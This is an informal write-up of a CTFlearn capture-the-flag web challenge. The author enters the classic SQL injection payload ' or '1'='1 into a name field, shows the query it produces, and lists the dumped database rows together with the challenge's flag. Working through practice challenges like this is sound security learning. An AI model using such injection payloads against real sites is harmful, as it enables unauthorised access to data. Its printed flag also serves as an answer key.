Description: 	
See if you can leak the whole database. The flag is in there somwhereâ€¦ https://web.ctflearn.com/web4/
---------------------------------------------------------------------------------
Process:
When we open the above stated page, we can see it's a simple website with text box and submit button. If we inspect the HTML code with F12, in the code we can see some names. We try Luke. That shows us that this database contains the names and corresponding data.
If you ever tried sql injection, this is the time to repeat it.
You could try entering something that the creator "didn't expect you to do" like:
' or '1'='1 
which might look like this in the code
SELECT * FROM users WHERE name = '' OR '1'='1';

you might guessed by now what does it do if u have some programming experience
the output of the website is like this:

Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii


so what in the world could be the flag? do out think that fl4g__giv3r might be the cue?
==================================================================================

he is
th4t_is_why_you_n33d_to_sanitiz3_inputs

and that's it
